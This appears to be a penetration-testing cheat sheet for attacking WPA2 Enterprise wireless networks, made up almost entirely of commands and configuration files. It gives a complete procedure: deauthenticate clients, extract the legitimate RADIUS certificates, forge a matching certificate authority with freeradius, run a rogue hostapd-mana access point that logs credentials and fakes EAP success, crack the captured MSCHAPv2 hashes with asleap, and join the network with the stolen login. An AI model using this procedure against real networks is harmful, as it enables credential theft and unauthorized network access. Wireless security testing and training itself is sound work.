
WPA2 Enterprise:

Look for WPA MGT network in airodump-ng.

```
airodump-ng -c <channel> -w <capture> wlan1mon
aireplay-ng -0 0 -a <BSSID_LEGITIMATE_AP> wlan1mon 
sudo airmon-ng stop wlan1mon
```

Grab certificate files from wireshark using filters:

```
wlan.bssid==XX:XX:XX:XX:XX:XX && eap && tls.handshake.certificate
wlan.bssid==XX:XX:XX:XX:XX:XX && eap && tls.handshake.type == 11,3
```

View Packet Details >> Extensible Authentication Protocol > Transport Layer Security > TLSv1 Record Layer: Handshake Protocol: Certificate

Save certificates to .der files: Right click cert string and click Export Packet Bytes. 

View SSL cert info:
```
openssl x509 -inform der -in CERTIFICATE_FILENAME -text
```

Use freeradius to provide fake cert to clients.

Alter certificate_authority block in /etc/freeradius/3.0/certs/ca.cnf:

```
[certificate_authority]
countryName             = US
stateOrProvinceName     = CA
localityName            = New York
organizationName        = Company
emailAddress            = ca@company.com
commonName              = "Company Certificate Authority"
```

Alter server block in /etc/freeradius/3.0/certs/server.cnf:

```
[server]
countryName             = US
stateOrProvinceName     = CA
localityName            = New York
organizationName        = Company
emailAddress            = ca@company.com
commonName              = "Company Certificate Authority"
```

Change dir to /etc/freeradius/3.0/certs/ and run:

```
rm dh
#make destroy certs
make
```

An error occurs but it doesn't matter because we don't use any client certificates.

Setup hostapd-mana for the rogue AP using the following **UPDATED** mana.conf file in /etc/hostapd-mana/mana.conf:

```
# SSID of the AP
ssid=TheSSID

# Network interface to use and driver type
# We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'
interface=wlan0
driver=nl80211

# Channel and mode
# Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)
channel=6
# Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax
hw_mode=g

# Setting up hostapd as an EAP server
ieee8021x=1
eap_server=1

# Key workaround for Win XP
eapol_key_index_workaround=0

# EAP user file
eap_user_file=/etc/hostapd-mana/mana.eap_user

# Certificate paths created earlier
ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key
# The password is actually 'whatever'
private_key_passwd=whatever
dh_file=/etc/freeradius/3.0/certs/dh

# Open authentication
auth_algs=1
# WPA/WPA2
wpa=3
# WPA Enterprise
wpa_key_mgmt=WPA-EAP
# Allow CCMP and TKIP
# Note: iOS warns when network has TKIP (or WEP)
wpa_pairwise=CCMP TKIP

# Enable Mana WPE
mana_wpe=1

# Store credentials in that file
mana_credout=/tmp/hostapd.credout

# Send EAP success, so the client thinks it's connected
mana_eapsuccess=1

# EAP TLS MitM
mana_eaptls=1
```

Use mana.eap_user file, move to /etc/hostapd-mana/mana.eap_user:

```
*     PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
```

Start hostapd-mana:
```
hostapd-mana /etc/hostapd-mana/mana.conf
```
If needed, deauth stations.

Hostapd-mana will output asleap commands, find a user with a successful login (from wireshark traffic) and run command like so:

```
<asleap command> -W /usr/share/john/password.lst
```

Create wpa_supplicant.conf file:

```
network={
  ssid="NetworkName"
  scan_ssid=1
  key_mgmt=WPA-EAP
  identity="Domain\username"
  password="password"
  eap=PEAP
  phase1="peaplabel=0"
  phase2="auth=MSCHAPV2"
}
```

Connect to network:

```
wpa_supplicant -i wlan0 -c <config file>
dhclient wlan0
```